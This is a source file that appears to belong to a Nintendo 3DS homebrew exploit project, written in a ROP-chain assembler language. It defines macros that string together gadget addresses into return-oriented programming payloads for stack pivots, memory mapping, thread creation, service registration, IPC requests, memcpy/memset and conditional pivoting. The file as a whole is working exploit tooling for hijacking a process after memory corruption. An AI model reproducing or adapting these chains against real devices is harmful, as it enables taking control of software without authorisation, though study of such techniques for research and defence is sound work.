include("../ropdb/ropdb.py")

@pop_macro
def POP_R0(r0):
    add_word(POP_R0PC)
    add_word(r0)

@pop_macro
def POP_R1(r1):
    add_word(POP_R1PC)
    add_word(r1)

@pop_macro
def POP_R3(r3):
    add_word(POP_R3PC)
    add_word(r3)

@pop_macro
def POP_R4(r4):
    add_word(POP_R4PC)
    add_word(r4)

@pop_macro
def POP_R1R2R3(r1, r2, r3):
    add_word(POP_R1R2R3PC)
    add_word(r1)
    add_word(r2)
    add_word(r3)

def SET_LR(lr):
    POP_R1R2R3(NOP, 0xDEADC0DE, lr)
    add_word(MOV_LRR3_BX_R1)

@macro
def PTM_SetInfoLEDPattern(pattern_addr):
    SET_LR(NOP)
    add_word(GET_THREAD_LOCAL_STORAGE)
    POP_R1(0x08010640) #cmd header
    add_word(ADD_R0R0_80_STR_R1R0_POP_R4PC)
    add_word(cmdbuf_copy_ptr)
    add_word(STR_R0R4_POP_R4PC) #store cmdbuf addr to cmdbuf_copy_ptr, to allow storing result after svcSendSyncRequest
    add_word(0xDEADC0DE)

    add_word(ADDS_R0R0_4_POP_R4PC)
    add_word(0xDEADC0DE)

    POP_R1R2R3(pattern_addr, 0x64, 0xDEADC0DE)
    add_word(MEMCPY)

    add_word(PTM_SENDSYNCREQ_POP_R2R3R4PC)
    add_word(0xDEADC0DE)
    put_label("cmdbuf_copy_ptr") #sp+4 needs to point to cmdbuf, used to store result
    add_word(0xDEADC0DE)
    add_word(0xDEADC0DE)

@macro
def svcReplyAndReceive(out_index_addr, handles_addr, count, reply_target_handle_ptr):
    SET_LR(NOP)
    load_in_r0(reply_target_handle_ptr)
    store_r0_to(reply_target_handle)

    add_word(POP_R0R1R2R3R4PC)
    add_word(out_index_addr)
    add_word(handles_addr)
    add_word(count)
    put_label("reply_target_handle")
    add_word(0xDEADCAFE)
    add_word(0xDEADC0DE)

    put_label("svc_call")
    add_word(SVC_REPLYANDRECEIVE)

    #restore the gadget because might need it in a "loop"
    store(svc_call, SVC_REPLYANDRECEIVE)

def svcSendSyncRequest(handle_ptr):
    SET_LR(NOP)
    load_in_r0(handle_ptr)
    add_word(SVC_SENDSYNCREQUEST)

@macro
def svcAcceptSession(out_handle_addr, server_port_ptr):
    SET_LR(NOP)
    load_in_r0(server_port_ptr)
    store_r0_to(server_port)

    add_word(POP_R1PC)
    put_label("server_port")
    add_word(0xDEADCAFE)

    POP_R0(out_handle_addr)
    add_word(SVC_ACCEPTSESSION)


def svcCreateThread(out_handle_addr, stack):
    SET_LR(POP_R4R5PC) # skip the two args after create_thread

    POP_R3(stack) #thread stack
    POP_R0(out_handle_addr) #valid addr for handle_out
    add_word(SVC_CREATETHREAD)
    add_word(0x31) #priority
    add_word(0xFFFFFFFE) # -2 => default cpu

def SRV_RegisterService(out_handle_addr, name_addr, name_len, max_session):
    SET_LR(NOP)
    add_word(POP_R0R1R2R3R4PC)
    add_word(out_handle_addr)
    add_word(name_addr)
    add_word(name_len)
    add_word(max_session)
    add_word(0xDEADC0DE)

    add_word(SRV_REGISTERSERVICE)

def SRV_GetServiceHandle(out_handle_addr, service_name_addr, service_name_len):
    SET_LR(NOP)
    POP_R0(out_handle_addr)
    POP_R1R2R3(service_name_addr, service_name_len, 0)
    add_word(SRV_GETSERVICEHANDLE)

def sleep(time_l, time_h=0):
    SET_LR(NOP)
    POP_R0(time_l)
    POP_R1(time_h)
    add_word(SVC_SLEEPTHREAD)

def stack_pivot(sp, func=NOP):
    POP_R0(sp)
    POP_R1(func)
    add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1)

def malloc(size):
    SET_LR(NOP)
    POP_R0(size)
    add_word(MALLOC)

def free(buf):
    SET_LR(NOP)
    POP_R0(buf)
    add_word(FREE)

def memcpy(dst, src, size):
    SET_LR(NOP)
    add_word(POP_R0R1R2R3R4PC)
    add_word(dst)
    add_word(src)
    add_word(size)
    add_word(0xDEADC0DE)
    add_word(0xDEADC0DE)

    add_word(MEMCPY)

def memcpy_load_dst(dst_ptr, src, size):
    SET_LR(NOP)
    load_in_r0(dst_ptr)
    POP_R1R2R3(src, size, 0xDEAC0DE)

    add_word(MEMCPY)

def memcpy_load_dst_off(dst_ptr, offset, src, size):
    SET_LR(NOP)

    load_in_r0(dst_ptr)
    POP_R1(offset)
    add_word(ADDS_R0R0R1_POP_R4PC)
    add_word(0xDEADC0DE)

    POP_R1R2R3(src, size, 0xDEAC0DE)

    add_word(MEMCPY)

def memset_load_dst(dst_ptr, val, size):
    SET_LR(NOP)
    load_in_r0(dst_ptr)
    POP_R1R2R3(size, val, 0xDEAC0DE)

    add_word(MEMSET)

def store(addr, v):
    POP_R0(addr)
    POP_R1(v)
    add_word(STR_R1R0_POP_R4PC)
    add_word(0xDEADC0DE)

def load_in_r0(addr):
    POP_R0(addr)
    add_word(LDR_R0R0_POP_R4PC)
    add_word(0xDEADC0DE)

def store_r0_to(addr):
    POP_R4(addr)
    add_word(STR_R0R4_POP_R4PC)
    add_word(0xDEADC0DE)

def map_mem(valid_out_addr, addr, size):
    SET_LR(POP_R4R5PC) # skip the two args after control_memory

    add_word(POP_R0R1R2R3R4PC)
    add_word(valid_out_addr) #valid addr for output addr
    add_word(addr) #addr0
    add_word(0) #addr1
    add_word(size) # size
    add_word(0xDEADCAFE) # r4 garbage

    add_word(SVC_CONTROLMEMORY)
    add_word(0x3) # map (commit)
    add_word(0x3) # RW

def map_linear_mem(valid_out_addr, addr, size):
    SET_LR(POP_R4R5PC) # skip the two args after control_memory

    add_word(POP_R0R1R2R3R4PC)
    add_word(valid_out_addr) #valid addr for output addr
    add_word(addr) #addr0
    add_word(0) #addr1
    add_word(size) # size
    add_word(0xDEADCAFE) # r4 garbage

    add_word(SVC_CONTROLMEMORY)
    add_word(0x10003) # map linear (linear|commit)
    add_word(0x3) # RW

@macro
def stack_pivot_if_r0_neq(v, addr):
    POP_R1(v)

    add_word(CMP_R0R1_MOVSNE_R0_0_MOVSEQ_R0_1_POP_R4PC)
    add_word(0x4)                   #r4=4 used by mul

    add_word(MUL_R0R4R0_POP_R4PC)   #r0=4*r0 -> offset for pivot_table
    add_word(0xDEADC0DE)

    POP_R1(pivot_table)
    add_word(ADDS_R0R0R1_POP_R4PC)  #r0=pivot_table+offset
    add_word(0xDEADC0DE)

    add_word(LDR_R0R0_POP_R4PC)     #r0=*r0 -> addr to pivot to
    add_word(0xDEADC0DE)

    POP_R1(NOP)
    add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1) #pivot according to initial r0 value!

    put_label("pivot_table")
    add_word(addr)              #if r0 != 0, then pivot to addr
    add_word(end)               #otherwise just pivot to the end of the macro

    put_label("end")
